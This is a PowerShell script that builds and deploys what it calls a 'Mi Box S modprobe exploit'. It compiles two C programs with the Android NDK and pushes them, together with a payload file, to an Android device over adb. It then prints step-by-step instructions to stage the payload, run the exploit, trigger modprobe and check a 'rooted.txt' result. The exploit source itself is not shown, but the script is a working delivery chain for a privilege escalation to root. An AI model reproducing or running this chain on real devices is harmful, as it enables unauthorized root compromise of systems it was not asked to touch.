Set-Location $PSScriptRoot

$ndk = "C:\Users\Administrator\AppData\Local\Android\Sdk\ndk\21.4.7075529"
$clang = "$ndk\toolchains\llvm\prebuilt\windows-x86_64\bin\armv7a-linux-androideabi24-clang.cmd"

Write-Host "=== Building Mi Box S modprobe exploit ===" -ForegroundColor Cyan
Write-Host ""

# Build kort_modprobe_2step
Write-Host "[1/2] Building kort_modprobe_2step..." -ForegroundColor Cyan
& $clang kort_modprobe_2step.c -o kort_modprobe_2step -static
if ($LASTEXITCODE -ne 0) {
  Write-Host "BUILD FAILED: kort_modprobe_2step" -ForegroundColor Red
  exit 1
}
Write-Host "  OK" -ForegroundColor Green

# Build trigger_modprobe
Write-Host "[2/2] Building trigger_modprobe..." -ForegroundColor Cyan
& $clang trigger_modprobe.c -o trigger_modprobe -static
if ($LASTEXITCODE -ne 0) {
  Write-Host "BUILD FAILED: trigger_modprobe" -ForegroundColor Red
  exit 1
}
Write-Host "  OK" -ForegroundColor Green

Write-Host ""
Write-Host "=== Build successful ===" -ForegroundColor Green
Write-Host ""

# Push to device
Write-Host "Pushing files to device..." -ForegroundColor Cyan
adb push kort_modprobe_2step /data/local/tmp/
adb push trigger_modprobe /data/local/tmp/
adb push x /data/local/tmp/x_payload

adb shell chmod 755 /data/local/tmp/kort_modprobe_2step
adb shell chmod 755 /data/local/tmp/trigger_modprobe
adb shell chmod 755 /data/local/tmp/x_payload

Write-Host ""
Write-Host "=== Files pushed ===" -ForegroundColor Green
Write-Host ""
Write-Host "Next steps on device:" -ForegroundColor Yellow
Write-Host "  1. Check /tmp: adb shell ls -la /tmp/"
Write-Host "  2. Create payload: adb shell cp /data/local/tmp/x_payload /tmp/tmp && chmod 755 /tmp/tmp"
Write-Host "  3. Run exploit: adb shell /data/local/tmp/kort_modprobe_2step"
Write-Host "  4. Trigger modprobe: adb shell /data/local/tmp/trigger_modprobe"
Write-Host "  5. Check result: adb shell cat /data/local/tmp/rooted.txt"
